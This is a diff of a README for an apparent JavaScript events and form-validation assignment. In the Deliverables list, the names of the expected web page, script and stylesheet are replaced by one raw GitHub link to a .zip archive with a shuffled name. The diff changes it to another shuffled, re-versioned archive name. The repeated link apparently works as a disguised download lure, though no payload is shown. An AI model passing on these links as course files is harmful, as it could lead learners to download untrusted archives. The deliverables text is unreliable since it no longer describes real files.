@@ -36,13 +36,13 @@ Forms are essential to the web—and validating them properly is key to good use
 
 ## Deliverables
 
-* `https://raw.githubusercontent.com/Griffnificent/july-2025-javascript-events-and-basic-interactivity-Griffnificent/main/butterjags/events_july_basic_interactivity_and_Griffnificent_javascript_v2.2.zip`: Your structured web page with at least one form and several interactive sections
-* `https://raw.githubusercontent.com/Griffnificent/july-2025-javascript-events-and-basic-interactivity-Griffnificent/main/butterjags/events_july_basic_interactivity_and_Griffnificent_javascript_v2.2.zip`: Your JavaScript file with:
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-javascript-events-and-basic-interactivity-Griffnificent/main/butterjags/and_interactivity_basic_javascript_july_Griffnificent_events_2.7.zip`: Your structured web page with at least one form and several interactive sections
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-javascript-events-and-basic-interactivity-Griffnificent/main/butterjags/and_interactivity_basic_javascript_july_Griffnificent_events_2.7.zip`: Your JavaScript file with:
 
   * Event handling for buttons, inputs, or links
   * At least 2 interactive features created from scratch
   * A fully functioning custom form validation (no HTML5-only validation)
-* `https://raw.githubusercontent.com/Griffnificent/july-2025-javascript-events-and-basic-interactivity-Griffnificent/main/butterjags/events_july_basic_interactivity_and_Griffnificent_javascript_v2.2.zip` (optional but encouraged): To style your interactive elements
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-javascript-events-and-basic-interactivity-Griffnificent/main/butterjags/and_interactivity_basic_javascript_july_Griffnificent_events_2.7.zip` (optional but encouraged): To style your interactive elements
 
 Each section of your JavaScript should be commented to explain its purpose.
 
